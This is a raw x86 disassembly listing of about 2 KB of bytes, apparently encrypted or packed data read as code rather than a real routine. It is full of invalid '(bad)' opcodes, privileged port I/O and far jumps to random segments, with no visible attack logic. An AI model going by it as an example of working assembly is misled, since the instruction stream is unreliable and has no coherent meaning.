  40225a:	or     eax,ecx
  40225c:	setl   ah
  40225f:	mov    bl,0xe6
  402261:	mov    bl,0x9b
  402263:	pop    ecx
  402264:	inc    edi
  402265:	xchg   edi,eax
  402266:	cmp    eax,0xc476748b
  40226b:	or     eax,0xa1efdb6f
  402270:	ret    
  402271:	rcl    BYTE PTR [edx-0x36558105],0x49
  402278:	xor    esi,DWORD PTR [edi]
  40227a:	or     BYTE PTR [edi+0x3026680e],bh
  402280:	out    0x1a,eax
  402282:	lods   al,BYTE PTR ds:[esi]
  402283:	mov    dl,0x79
  402285:	xchg   ebx,eax
  402286:	hlt    
  402287:	stc    
  402288:	and    ah,BYTE PTR [edx+0x6c]
  40228b:	mov    eax,ds:0x52e8a740
  402290:	ins    DWORD PTR es:[edi],dx
  402291:	cmp    al,0x4
  402293:	cmp    ecx,ebp
  402295:	repnz sbb DWORD PTR [esi+0x6af24b39],ebx
  40229c:	xor    eax,0x53c0fe88
  4022a1:	inc    ebp
  4022a2:	fucom  st(5)
  4022a4:	dec    esi
  4022a5:	jnp    0x402227
  4022a7:	leave  
  4022a8:	popa   
  4022a9:	sub    eax,DWORD PTR [edx+ebp*8]
  4022ac:	dec    ebx
  4022ad:	imul   BYTE PTR [edx+0x66352b0b]
  4022b3:	cli    
  4022b4:	sbb    eax,0xc4c10fee
  4022b9:	ret    0xa5c5
  4022bc:	imul   ecx,DWORD PTR [esi],0x2e
  4022bf:	in     al,0x42
  4022c1:	mov    dl,0xb1
  4022c3:	gs es lahf 
  4022c6:	jmp    0x3ba1:0x6410c7ba
  4022cd:	ins    BYTE PTR es:[edi],dx
  4022ce:	and    BYTE PTR [eax-0x59e7c164],dh
  4022d4:	mov    esp,0x8e946943
  4022d9:	test   eax,0x429ce56c
  4022de:	xchg   edx,eax
  4022df:	push   ds
  4022e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e1:	mov    bl,bh
  4022e3:	add    BYTE PTR [ebx-0xafb086],dh
  4022e9:	rcl    DWORD PTR [eax+0x70],0x87
  4022ed:	shl    DWORD PTR [ebx-0xdfb8609],1
  4022f3:	repnz add BYTE PTR [edi+edx*4-0x24c4c016],al
  4022fb:	xlat   BYTE PTR ds:[ebx]
  4022fc:	or     ch,al
  4022fe:	mov    DWORD PTR ds:[esi],esp
  402301:	(bad)  
  402302:	ins    BYTE PTR es:[edi],dx
  402303:	inc    esp
  402304:	aaa    
  402305:	inc    eax
  402306:	jno    0x402318
  402308:	daa    
  402309:	inc    esp
  40230a:	shr    DWORD PTR [ebx],cl
  40230c:	mov    ebp,0x789df45a
  402311:	ins    DWORD PTR es:[edi],dx
  402312:	lods   ax,WORD PTR ds:[esi]
  402314:	popa   
  402315:	aam    0x8e
  402317:	xchg   edx,eax
  402318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402319:	popf   
  40231a:	ret    
  40231b:	mov    bh,0xc2
  40231d:	push   edi
  40231e:	xor    eax,esp
  402320:	push   ebp
  402321:	arpl   WORD PTR [eax+eiz*8-0x3c990c10],si
  402328:	jge    0x40239a
  40232a:	push   0x71
  40232c:	rcr    dh,1
  40232e:	scas   al,BYTE PTR es:[edi]
  40232f:	mov    es,WORD PTR [esp+esi*8-0x6a]
  402333:	cmp    bh,BYTE PTR [ebx]
  402335:	jb     0x40230c
  402337:	loope  0x402395
  402339:	push   ebp
  40233a:	lahf   
  40233b:	push   es
  40233c:	push   ebp
  40233d:	aam    0x49
  40233f:	mov    esi,0xef1ee20c
  402344:	lahf   
  402345:	add    BYTE PTR [ebp+0x435dfef2],ah
  40234b:	loope  0x402391
  40234d:	mov    dl,BYTE PTR [edi-0x18]
  402350:	or     al,bl
  402352:	fisub  WORD PTR [ebx-0x3e]
  402355:	mov    edi,0xa5402333
  40235a:	xchg   esi,edi
  40235c:	adc    DWORD PTR [edi],edx
  40235e:	bound  edx,QWORD PTR [ebx+0x37]
  402361:	fst    QWORD PTR [eax+esi*1+0x6b]
  402365:	(bad)  
  402366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402367:	add    DWORD PTR [esi+eax*4+0xd],ecx
  40236b:	(bad)  
  40236c:	call   0x53728a66
  402371:	ret    
  402372:	lods   al,BYTE PTR ds:[esi]
  402373:	dec    eax
  402374:	sbb    edi,DWORD PTR cs:[ebx]
  402377:	sbb    eax,0x3d121144
  40237c:	and    eax,0x5cd976bf
  402381:	pop    ebp
  402382:	mov    eax,ds:0x5029119f
  402387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402388:	mov    ah,BYTE PTR [edx-0x5cbc3ae7]
  40238e:	mov    dl,0x39
  402390:	sbb    eax,0x6f4ef3e9
  402395:	xlat   BYTE PTR ds:[ebx]
  402396:	pop    esi
  402397:	outs   dx,BYTE PTR ds:[esi]
  402398:	or     al,BYTE PTR [ecx]
  40239a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239b:	inc    ebx
  40239c:	adc    al,0x5f
  40239e:	add    BYTE PTR ds:0xfdee1d0b,0x4e
  4023a5:	mov    dl,0x8a
  4023a7:	fdiv   st,st(0)
  4023a9:	jo     0x4023ca
  4023ab:	xchg   ebp,eax
  4023ac:	sub    cl,BYTE PTR [ecx]
  4023ae:	js     0x402330
  4023b0:	inc    ecx
  4023b1:	push   esi
  4023b2:	dec    ebx
  4023b3:	lahf   
  4023b4:	add    ch,ch
  4023b6:	add    edx,DWORD PTR [edx+0x6dcb17af]
  4023bc:	xchg   ebx,eax
  4023bd:	imul   ebx,DWORD PTR [ebx-0x2f026b67],0x4e423410
  4023c7:	repnz outs dx,BYTE PTR ds:[esi]
  4023c9:	xor    ebx,DWORD PTR [edx+0x4d]
  4023cc:	(bad)  
  4023ce:	add    ch,dl
  4023d0:	in     eax,0x77
  4023d2:	int3   
  4023d3:	das    
  4023d4:	add    dl,BYTE PTR [ecx+0x33]
  4023d7:	sub    eax,0xffead1c3
  4023dc:	jge    0x402378
  4023de:	mov    ?,WORD PTR [eax+0x7f]
  4023e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e2:	pop    ebp
  4023e3:	clc    
  4023e4:	or     al,0x16
  4023e6:	out    dx,eax
  4023e7:	cwde   
  4023e8:	jmp    0x402390
  4023ea:	into   
  4023eb:	xorps  xmm5,XMMWORD PTR [esi-0x161008d8]
  4023f2:	add    eax,0xa5f346d3
  4023f7:	jl     0x4023cd
  4023f9:	(bad)  
  4023fa:	push   edx
  4023fb:	(bad)
  4023fe:	mov    al,cs:0x4651057
  402404:	cld    
  402405:	cwde   
  402406:	mov    gs,WORD PTR [ebx-0x646b2475]
  40240c:	pop    es
  40240d:	sbb    ecx,esp
  40240f:	and    ch,0xab
  402412:	aas    
  402413:	mov    eax,ds:0xcdaccbb6
  402418:	add    esi,DWORD PTR [edi]
  40241a:	sub    eax,0xe419fa1c
  40241f:	ret    
  402420:	mov    dh,0xed
  402422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402423:	in     eax,dx
  402424:	sbb    DWORD PTR [ecx],ebx
  402426:	cli    
  402427:	gs into 
  402429:	add    BYTE PTR [esi],ch
  40242b:	out    0x75,eax
  40242d:	inc    esi
  40242e:	push   esi
  40242f:	in     al,dx
  402430:	setae  BYTE PTR [ebx+0x9cbdad]
  402437:	add    eax,0x3306776c
  40243c:	(bad)  
  40243d:	mov    eax,ds:0x499c75f
  402442:	sbb    ebx,DWORD PTR [edi+0x11]
  402445:	mov    bh,0xca
  402447:	test   DWORD PTR [eax],esp
  402449:	ins    BYTE PTR es:[edi],dx
  40244a:	pop    ebx
  40244b:	je     0x4023e4
  40244d:	sbb    al,0xaa
  40244f:	adc    eax,0xc07c05ac
  402454:	popa   
  402455:	cli    
  402456:	jo     0x40245a
  402458:	popf   
  402459:	cmp    BYTE PTR [ebx+0x1c477cad],bh
  40245f:	in     al,0x5d
  402461:	repnz and dl,ch
  402464:	sbb    bh,BYTE PTR [ecx+0x58]
  402467:	test   BYTE PTR [edi+0x7e],0x99
  40246b:	es int 0xcd
  40246e:	js     0x4024e1
  402470:	test   eax,0xa8a13ca2
  402475:	pop    esp
  402476:	jbe    0x402408
  402478:	sbb    al,0x71
  40247a:	xchg   esi,eax
  40247b:	mov    dh,0x3
  40247d:	aad    0xf0
  40247f:	mov    ecx,0x26c7e901
  402484:	adc    BYTE PTR [bp+di+0x33],dh
  402488:	clc    
  402489:	jg     0x402419
  40248b:	sbb    al,0x8
  40248d:	sub    edi,DWORD PTR [edi+ecx*8-0x40a03937]
  402494:	(bad)  
  402495:	daa    
  402496:	mov    eax,0xc797a3f9
  40249b:	mov    ds:0xbd8e95f1,al
  4024a0:	mov    cl,BYTE PTR [eax]
  4024a2:	aas    
  4024a3:	in     eax,dx
  4024a4:	pop    ds
  4024a5:	iret   
  4024a6:	jns    0x402498
  4024a8:	(bad)  
  4024a9:	stc    
  4024aa:	push   ecx
  4024ab:	jnp    0x40247f
  4024ad:	call   0xfb25e23a
  4024b2:	mov    al,ds:0x1d08298f
  4024b7:	enter  0x1fb6,0xce
  4024bb:	cwde   
  4024bc:	jb     0x4024f9
  4024be:	test   BYTE PTR [ebx+0x2f],0xaa
  4024c2:	push   ebp
  4024c3:	fiadd  DWORD PTR [edi-0x1c]
  4024c6:	popa   
  4024c7:	mov    ebp,DWORD PTR [esi]
  4024c9:	adc    al,0xbe
  4024cb:	mov    eax,ds:0x3b26dab4
  4024d0:	cmp    ecx,ecx
  4024d2:	ja     0x4024f3
  4024d4:	sti    
  4024d5:	lds    eax,FWORD PTR [ebx]
  4024d7:	jnp    0x4024ba
  4024d9:	mov    cl,0x82
  4024db:	jns    0x40250d
  4024dd:	aaa    
  4024de:	fsubr  st(3),st
  4024e0:	scas   al,BYTE PTR es:[edi]
  4024e1:	in     eax,dx
  4024e2:	stos   BYTE PTR es:[edi],al
  4024e3:	sub    DWORD PTR [ebp+edx*1+0x2a],esi
  4024e7:	push   0x44
  4024e9:	ins    DWORD PTR es:[edi],dx
  4024ea:	add    ch,ch
  4024ec:	aam    0xa4
  4024ee:	jmp    0x6076:0xa58e2438
  4024f5:	cmp    al,0x8
  4024f7:	add    esi,DWORD PTR [esi+0x77]
  4024fa:	scas   al,BYTE PTR es:[edi]
  4024fb:	fwait
  4024fc:	lahf   
  4024fd:	and    DWORD PTR [eax],esp
  4024ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402500:	aad    0x33
  402502:	dec    esi
  402503:	mov    ah,0x70
  402505:	and    eax,0x440e0fe8
  40250a:	mov    dh,BYTE PTR cs:[ebx+ecx*1]
  40250e:	add    eax,0x2117ef99
  402513:	and    DWORD PTR [ecx],ebp
  402515:	rcl    esi,1
  402517:	sar    BYTE PTR ds:0x5982f846,0xb5
  40251e:	out    0x7,eax
  402520:	sbb    BYTE PTR [edi],cl
  402522:	mov    ecx,0x778c68d7
  402527:	xor    bl,BYTE PTR [edx*1+0x47007ee8]
  40252e:	mov    bl,bl
  402530:	out    dx,al
  402531:	imul   eax,DWORD PTR [ecx],0xa
  402534:	add    DWORD PTR [ebx-0x72],0x7b
  402538:	stos   BYTE PTR es:[edi],al
  402539:	mov    esi,0x8c70debc
  40253e:	leave  
  40253f:	xchg   DWORD PTR fs:[ebx+ebp*1+0xa97a287],eax
  402547:	(bad)  
  402548:	es jecxz 0x4024f3
  40254b:	(bad)  
  40254c:	call   0x7ad7abae
  402551:	aaa    
  402552:	push   ecx
  402553:	xchg   esi,eax
  402554:	nop
  402555:	vpavgb xmm3,xmm3,XMMWORD PTR [edx-0x16649802]
  40255d:	push   DWORD PTR [edi]
  40255f:	stc    
  402560:	adc    al,0x0
  402562:	mov    dh,0x4f
  402564:	dec    ebp
  402565:	out    dx,al
  402566:	pop    ss
  402567:	in     al,dx
  402568:	lea    ebx,[ecx-0x1a2ed9a2]
  40256e:	lahf   
  40256f:	pop    ds
  402570:	out    0x62,al
  402572:	(bad)
  402576:	ret    0xeb52
  402579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40257a:	popf   
  40257b:	xlat   BYTE PTR ds:[ebx]
  40257c:	jno    0x4025ec
  40257e:	in     al,dx
  40257f:	cdq    
  402580:	inc    edi
  402581:	mov    ebx,0x93177dd4
  402586:	cmp    al,0xde
  402588:	cmp    esi,esp
  40258a:	or     BYTE PTR [ebp+0x7dd1a8f3],bh
  402590:	call   0x7ca6:0xd79f2bc5
  402597:	and    al,0xfa
  402599:	jnp    0x40256b
  40259b:	call   0xa90f:0xefc0bd6d
  4025a2:	daa    
  4025a3:	mov    edi,0x842c8bda
  4025a8:	push   ss
  4025a9:	sahf   
  4025aa:	mov    ebp,0x6cc39348
  4025af:	test   eax,0xc8cae4c0
  4025b4:	mov    DWORD PTR [esi-0x18],edx
  4025b7:	xor    al,0x32
  4025b9:	pop    ebx
  4025ba:	sbb    DWORD PTR ds:0xe0102ebf,eax
  4025c0:	(bad)  
  4025c1:	cld    
  4025c2:	out    dx,al
  4025c3:	mov    edx,0xfffc0ca7
  4025c8:	ss stc 
  4025ca:	or     DWORD PTR [edi+0x66c99a7c],ebp
  4025d0:	stc    
  4025d1:	out    0xc,al
  4025d3:	mov    al,ds:0x267a62a5
  4025d8:	cwde   
  4025d9:	sub    bh,ah
  4025db:	addr16 dec ebx
  4025dd:	dec    ebx
  4025de:	add    dh,bl
  4025e0:	dec    ecx
  4025e1:	ins    DWORD PTR es:[edi],dx
  4025e2:	cmp    DWORD PTR [edx],esp
  4025e4:	dec    ecx
  4025e5:	push   cs
  4025e6:	in     eax,0x17
  4025e8:	std    
  4025e9:	aam    0x0
  4025eb:	adc    al,BYTE PTR [eax-0x34]
  4025ee:	dec    ecx
  4025ef:	cmp    al,0x28
  4025f1:	(bad)  
  4025f2:	sbb    DWORD PTR [edi-0x58],ebp
  4025f5:	fist   WORD PTR [ebx]
  4025f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025f8:	jno    0x402615
  4025fa:	add    eax,0x6c6a357a
  4025ff:	lock jne 0x40266d
  402602:	push   ds
  402603:	jle    0x40266b
  402605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402606:	out    dx,eax
  402607:	sub    al,0xa9
  402609:	inc    ebx
  40260a:	fdivr  DWORD PTR [ebx+edx*4+0x4b8264fd]
  402611:	sub    eax,0x957053b1
  402616:	mov    ebp,0xbdc1245b
  40261b:	push   es
  40261c:	(bad)  
  40261d:	mov    eax,0xa051138f
  402622:	jmp    0x879b:0x3e477023
  402629:	mov    eax,0x751e026c
  40262e:	in     eax,0xe0
  402630:	mov    eax,ds:0x8c89717b
  402635:	push   es
  402636:	shl    BYTE PTR [ebp+edx*4+0x5d8c39cf],1
  40263d:	jge    0x4025ce
  40263f:	and    BYTE PTR [edx],al
  402641:	adc    BYTE PTR [edi],al
  402643:	xor    BYTE PTR [ebp-0x3a],dl
  402646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402647:	mov    cl,0x4
  402649:	add    DWORD PTR [esi-0x58],edi
  40264c:	mov    gs,WORD PTR [edi]
  40264e:	adc    cl,al
  402650:	lods   al,BYTE PTR ds:[esi]
  402651:	fsub   st(7),st
  402653:	outs   dx,DWORD PTR gs:[esi]
  402655:	adc    dl,ch
  402657:	enter  0x6e40,0x1e
  40265b:	outs   dx,DWORD PTR ds:[esi]
  40265c:	lock mov ds:0x6a829bbc,eax
  402662:	mov    ds:0xcff3f713,al
  402667:	xor    al,0x13
  402669:	(bad)  
  40266a:	xor    esp,DWORD PTR [esi]
  40266c:	push   ebp
  40266d:	sub    al,0x76
  40266f:	sub    ecx,eax
  402671:	mov    al,ds:0x38be00fc
  402676:	adc    DWORD PTR [ecx-0x6b],0xc1b9d128
  40267d:	push   esi
  40267e:	aaa    
  40267f:	mov    al,0xbd
  402681:	call   0x16e6a455
  402686:	cmp    eax,0x358b91b0
  40268b:	sbb    ch,BYTE PTR [ecx-0x4cf15114]
  402691:	mov    cl,0x62
  402693:	pop    esi
  402694:	cmp    ah,dl
  402696:	dec    ecx
  402697:	mov    bh,0x99
  402699:	push   0x53397668
  40269e:	sub    BYTE PTR [eax],dl
  4026a0:	adc    ah,cl
  4026a2:	jnp    0x40264d
  4026a4:	jo     0x40268e
  4026a6:	gs ror eax,1
  4026a9:	push   ss
  4026aa:	jmp    0x41af:0x6aef2c2f
  4026b1:	aad    0xba
  4026b3:	dec    edi
  4026b4:	cmp    eax,0x2cb0513c
  4026b9:	xchg   esp,eax
  4026ba:	push   cs
  4026bb:	loope  0x4026b1
  4026bd:	lods   eax,DWORD PTR ds:[esi]
  4026be:	or     BYTE PTR [ebp+0xc8d7c08],ah
  4026c4:	dec    ecx
  4026c5:	mov    ch,0x19
  4026c7:	pop    eax
  4026c8:	inc    edi
  4026c9:	leave  
  4026ca:	shl    DWORD PTR [ecx+0x53595dcf],0x42
  4026d1:	jbe    0x402728
  4026d3:	cld    
  4026d4:	xor    eax,0xaaab953d
  4026d9:	(bad)  
  4026db:	dec    esi
  4026dc:	jb     0x402732
  4026de:	shr    BYTE PTR [eax-0x1a],0x4
  4026e2:	lea    ebx,[ebp+0x1cef3c7f]
  4026e8:	mov    esp,0x892244a0
  4026ed:	pop    ebx
  4026ee:	mov    esi,0xe8b2da0e
  4026f3:	pop    ds
  4026f4:	jmp    0x9f9d7603
  4026f9:	ja     0x402709
  4026fb:	cwde   
  4026fc:	jnp    0x402687
  4026fe:	and    BYTE PTR [edi],0x46
  402701:	lods   eax,DWORD PTR ds:[esi]
  402702:	cmp    dl,cl
  402704:	or     dl,bh
  402706:	sbb    dh,bl
  402708:	push   ds
  402709:	cmc    
  40270a:	add    al,0xa8
  40270c:	lock and DWORD PTR [edx+0x17c4ad2],ebx
  402713:	xchg   esi,eax
  402714:	fstp   st(1)
  402716:	sbb    al,0x92
  402718:	add    dh,ch
  40271a:	cmp    BYTE PTR [ecx+0x7b],cl
  40271d:	jb     0x4026ab
  40271f:	inc    esp
  402720:	and    al,0x14
  402722:	add    BYTE PTR [ebx-0x15fa9c30],bh
  402728:	stos   DWORD PTR es:[edi],eax
  402729:	arpl   WORD PTR [edi+0x87a372d],dx
  40272f:	je     0x4026fd
  402731:	lods   eax,DWORD PTR ds:[esi]
  402732:	das    
  402733:	mov    dh,0xb1
  402735:	adc    dl,BYTE PTR [edi-0x6]
  402738:	(bad)  
  402739:	in     al,dx
  40273a:	fwait
  40273b:	fwait
  40273c:	popa   
  40273d:	es pop es
  40273f:	add    BYTE PTR [edi],dl
  402741:	stos   BYTE PTR es:[edi],al
  402742:	lock loopne 0x402739
  402745:	in     al,dx
  402746:	rcl    BYTE PTR ds:0x8fb60d83,1
  40274c:	and    dl,BYTE PTR [edi+0x69]
  40274f:	stos   DWORD PTR es:[edi],eax
  402750:	cmp    dh,BYTE PTR [ebx]
  402752:	ror    eax,1
  402754:	jmp    0x402791
  402756:	mov    ch,0xd8
  402758:	fdivr  st,st(2)
  40275a:	inc    ebx
  40275b:	retf   
  40275c:	fnstsw WORD PTR [eax]
  40275e:	jns    0x40273d
  402760:	mov    eax,0x667c589d
  402765:	push   ebp
  402766:	jae    0x402789
  402768:	jb     0x402777
  40276a:	ficomp WORD PTR [ebp-0x3a]
  40276d:	add    al,0x11
  40276f:	add    al,0xf5
  402771:	mov    bl,0x3b
  402773:	cli    
  402774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402775:	xchg   DWORD PTR [esi+0x4d],ecx
  402778:	(bad)  
  402779:	and    eax,0x99f20079
  40277e:	les    eax,FWORD PTR [edx+0x1cd3193d]
  402784:	into   
  402785:	mov    eax,0x9057d521
  40278a:	mov    cl,0x7b
  40278c:	cli    
  40278d:	adc    bh,dh
  40278f:	(bad)  
  402790:	clc    
  402791:	call   0x70be:0x3635e5b1
  402798:	xlat   BYTE PTR ds:[ebx]
  402799:	cmc    
  40279a:	and    cl,bh
  40279c:	call   0x9ec2b8db
  4027a1:	repnz sar DWORD PTR [ecx+0x58],cl
  4027a5:	mov    al,0xcc
  4027a7:	sahf   
  4027a8:	mov    BYTE PTR [ebp+0x70ff0c19],bl
  4027ae:	xor    edi,edi
  4027b0:	or     eax,DWORD PTR [ecx-0x33]
  4027b3:	cli    
  4027b4:	stos   BYTE PTR es:[edi],al
  4027b5:	push   ebx
  4027b6:	idiv   bl
  4027b8:	cmp    ecx,DWORD PTR [ebx-0x4a]
  4027bb:	add    DWORD PTR [ecx],esi
  4027bd:	fs ret 
  4027bf:	cmp    eax,0xa905e973
  4027c4:	aam    0x6
  4027c6:	mov    ds:0x141bd2a4,eax
  4027cb:	push   esi
  4027cc:	inc    eax
  4027cd:	inc    ecx
  4027ce:	and    al,BYTE PTR [edi]
  4027d0:	pushf  
  4027d1:	jecxz  0x4027b7
  4027d3:	fcomp  DWORD PTR [ebx]
  4027d5:	aam    0xc1
  4027d7:	nop
  4027d8:	inc    ecx
  4027d9:	pusha  
  4027da:	mov    bl,0xb7
  4027dc:	pop    edi
  4027dd:	(bad)
  4027e0:	js     0x40279a
  4027e2:	mov    eax,0x4b9aa615
  4027e7:	bound  esp,QWORD PTR [ecx+0x523b1a5b]
  4027ed:	push   edi
  4027ee:	retf   0x851b
  4027f1:	pop    ss
  4027f2:	mov    ecx,0x1f5a4bc2
  4027f7:	mov    bh,0x6a
  4027f9:	xor    BYTE PTR fs:[esi-0x41],cl
  4027fd:	fdiv   DWORD PTR [ebx+0x6877d8a8]
  402803:	push   eax
  402804:	mov    esi,0x72ac4c9a
  402809:	jmp    0x427ac8ba
  40280e:	int3   
  40280f:	repz xor BYTE PTR [ecx],al
  402812:	pusha  
  402813:	mov    WORD PTR [edx-0x16a7d760],es
  402819:	sar    BYTE PTR [ebx],0xb9
  40281c:	cs adc al,0xbd
  40281f:	cld    
  402820:	push   ecx
  402821:	or     edx,DWORD PTR [ebx-0x15]
  402824:	inc    edi
  402825:	mov    ah,0x9c
  402827:	aas    
  402828:	pushf  
  402829:	xchg   edx,eax
  40282a:	push   DWORD PTR [ecx+0x59f552db]
  402830:	sbb    eax,0xc579724d
  402835:	dec    ecx
  402836:	fwait
  402837:	jmp    0x4027e5
  402839:	jae    0x4028a2
  40283b:	inc    esp
  40283c:	mov    cl,0x58
  40283e:	fnclex 
  402840:	xor    eax,0x96090123
  402845:	clc    
  402846:	call   0x292e7086
  40284b:	jmp    0x2ed1870
  402850:	cli    
  402851:	cmc    
  402852:	pop    ebx
  402853:	and    BYTE PTR ds:0x4f67792e,al
  402859:	pop    edx
  40285a:	adc    al,0x97
  40285c:	dec    esp
  40285d:	sbb    al,0x9
  40285f:	and    BYTE PTR [ecx-0x176e25ae],ch
  402865:	push   eax
  402866:	mov    edi,0x8f8df59f
  40286b:	and    ch,BYTE PTR [ebp-0x1d]
  40286e:	addr16 dec edx
  402870:	test   al,0x7b
  402872:	(bad)  
  402873:	rcl    BYTE PTR [edi+eax*1-0x6d],cl
  402877:	mov    ecx,0x7b23118c
  40287c:	fs jns 0x4028e2
  40287f:	data16 mov bh,0x39
  402882:	dec    esp
  402883:	push   es
  402884:	popa   
  402885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402886:	iret   
  402887:	push   eax
  402888:	pop    edx
  402889:	xor    edx,DWORD PTR [edx]
  40288b:	aaa    
  40288c:	mov    edi,0x9352a558
  402891:	div    BYTE PTR [ebp-0x5a08285]
  402897:	sar    cl,0xe9
  40289a:	sub    bl,dh
  40289c:	fldenv [ecx-0x2e12126b]
  4028a2:	cmp    al,0xa3
  4028a4:	jne    0x402888
  4028a6:	pushf  
  4028a7:	imul   ebp,DWORD PTR [edx+0xb],0x147da75e
  4028ae:	hlt    
  4028af:	outs   dx,BYTE PTR ds:[esi]
  4028b0:	inc    ebp
  4028b1:	or     DWORD PTR [edi],0xe6dbf599
  4028b7:	(bad)  
  4028b8:	mov    ds:0x7f8d3ef5,al
  4028bd:	pop    edi
  4028be:	add    ebx,ebx
  4028c0:	lahf   
  4028c1:	loopne 0x402844
  4028c3:	cmp    eax,0x56518bc0
  4028c8:	out    dx,al
  4028c9:	in     eax,dx
  4028ca:	add    al,0xc
  4028cc:	ss mov ecx,0x24a0c7f3
  4028d2:	ret    
  4028d3:	stc    
  4028d4:	push   es
  4028d5:	mov    ds:0xb7901239,eax
  4028da:	rol    BYTE PTR [ebp-0x5256bfee],0xca
  4028e1:	aam    0x47
  4028e3:	pop    edi
  4028e4:	xor    dl,al
  4028e6:	fbstp  TBYTE PTR [ebx-0x175226a1]
  4028ec:	adc    ebp,DWORD PTR [ebp+0x72ca41d7]
  4028f2:	pop    ebp
  4028f3:	xor    ah,BYTE PTR [eax+0x2]
  4028f6:	in     eax,0x8b
  4028f8:	adc    DWORD PTR [ebx+0x13e74a76],ecx
  4028fe:	dec    ebx
  4028ff:	pop    esp
  402900:	or     BYTE PTR [eax],bh
  402902:	mov    edx,?
  402904:	mov    esi,0x6958ea3b
  402909:	push   esp
  40290a:	jge    0x4028ad
  40290c:	mov    ebx,0xebc8e05a
  402911:	sahf   
  402912:	xchg   DWORD PTR [ebp+0x71],esi
  402915:	sar    DWORD PTR [ecx+0x4bf09a86],1
  40291b:	or     al,0x85
  40291d:	aam    0xca
  40291f:	mov    dh,0x65
  402921:	cmp    DWORD PTR [bp+0x71],esp
  402925:	pop    es
  402926:	xchg   ecx,eax
  402927:	xchg   dl,cl
  402929:	mov    ebx,0xf294a684
  40292e:	push   edx
  40292f:	mov    edi,0xfe246e69
  402934:	pop    eax
  402935:	mov    eax,ds:0x231bc1c9
  40293a:	fprem1 
  40293c:	cmp    DWORD PTR [ebx+0x13347eb8],esi
  402942:	adc    al,0x43
  402944:	xor    al,0xf1
  402946:	ins    BYTE PTR es:[edi],dx
  402947:	dec    ebx
  402948:	mov    DWORD PTR [edx+0x2cc91503],ecx
  40294e:	dec    edx
  40294f:	dec    edi
  402950:	pop    ebx
  402951:	outs   dx,DWORD PTR ds:[esi]
  402952:	test   DWORD PTR [edx-0x67],0x7cb7387a
  402959:	inc    esp
  40295a:	mov    ds:0xa4f8a51b,eax
  40295f:	pop    edx
  402960:	retf   
  402961:	mov    bh,BYTE PTR [eax+0x1d]
  402964:	sbb    DWORD PTR ds:[ebp+0x5b],0x7b
  402969:	jmp    0x4029c9
  40296b:	dec    DWORD PTR [esi+ebx*8]
  40296e:	sbb    ecx,ecx
  402970:	rcr    DWORD PTR [esi+0x6d],cl
  402973:	xlat   BYTE PTR ds:[ebx]
  402974:	retf   0xbc3b
  402977:	jnp    0x40290e
  402979:	sbb    BYTE PTR [edi+0x40986708],0x5b
  402980:	inc    ebp
  402981:	loopne 0x4029d4
  402983:	cdq    
  402984:	dec    esi
  402985:	ds xchg ebp,eax
  402987:	out    0x78,eax
  402989:	mov    es,WORD PTR [ebp+0xc1f5ead]
  40298f:	cmp    eax,0xb9d6d294
  402994:	dec    edx
  402995:	dec    edx
  402996:	sub    BYTE PTR [eax-0x71],al
  402999:	adc    al,0xcc
  40299b:	daa    
  40299c:	rcr    bl,0x11
  40299f:	sbb    al,0x4b
  4029a1:	and    BYTE PTR [eax],al
  4029a3:	fwait
  4029a4:	aam    0x96
  4029a6:	dec    ebp
  4029a7:	sub    al,0x81
  4029a9:	and    eax,0x64c57ab7
  4029ae:	xchg   edx,eax
  4029af:	mov    esp,0xdebde90d
  4029b4:	repz sub esi,DWORD PTR [ebx]
  4029b7:	xor    cl,BYTE PTR [esi+0x17]
  4029ba:	fwait
  4029bb:	gs addr16 jge 0x402973
  4029bf:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4029c1:	icebp  
  4029c2:	mov    bl,0xf
  4029c4:	int3   
  4029c5:	adc    ebx,ecx
  4029c7:	xor    dl,BYTE PTR [esi+eax*1-0x466047e3]
  4029ce:	mov    esp,0x8dee3b49
  4029d3:	stos   BYTE PTR es:[edi],al
  4029d4:	int    0xce
  4029d6:	add    dl,BYTE PTR [ecx-0x45868b1b]
  4029dc:	shr    dl,1
  4029de:	mov    gs,ecx
  4029e0:	daa    
  4029e1:	adc    dl,BYTE PTR [ebp-0x17d5fcbc]
  4029e7:	jmp    0xa15190c
  4029ec:	test   BYTE PTR ds:0x28a99f9b,bl
  4029f2:	jns    0x4029c4
  4029f4:	cmp    al,0x1b
  4029f6:	push   edi
  4029f7:	mov    ebp,0x8af7df64
  4029fc:	xor    ch,BYTE PTR [edi+0x69]
  4029ff:	mov    bh,0xde
  402a01:	lahf   
  402a02:	retf   
  402a03:	out    dx,al
  402a04:	ficom  DWORD PTR [esi+eax*1]
  402a07:	sbb    DWORD PTR [ebx-0xb6b7b6f],esi
  402a0d:	xchg   edx,eax
  402a0e:	es cld 
  402a10:	mov    ch,0x4b
  402a12:	pop    ebx
  402a13:	out    dx,al
  402a14:	aaa    
  402a15:	xor    al,0x70
  402a17:	(bad)  
  402a18:	stc    
  402a19:	and    al,0xcb
  402a1b:	mov    esi,0x7e346edf
  402a20:	les    ebp,FWORD PTR [ebx+0x8]
  402a23:	popf   
  402a24:	lock cli 
  402a26:	mov    ch,0xfc
  402a28:	sbb    cl,BYTE PTR [edi-0x561b6ac9]
  402a2e:	aaa    
  402a2f:	(bad)  
  402a30:	call   0x7d12b16d
  402a35:	cmp    DWORD PTR [eax],ecx
  402a37:	inc    ecx
  402a38:	xor    bh,dh
  402a3a:	icebp  
  402a3b:	jl     0x4029c5
  402a3d:	cmp    ah,BYTE PTR [edi]
  402a3f:	xchg   BYTE PTR [ecx],dh
  402a41:	out    0x94,al
  402a43:	and    cl,cl
  402a45:	xchg   ecx,eax
  402a46:	mov    eax,0x4cdacd3e
  402a4b:	in     al,0x77
  402a4d:	aaa    
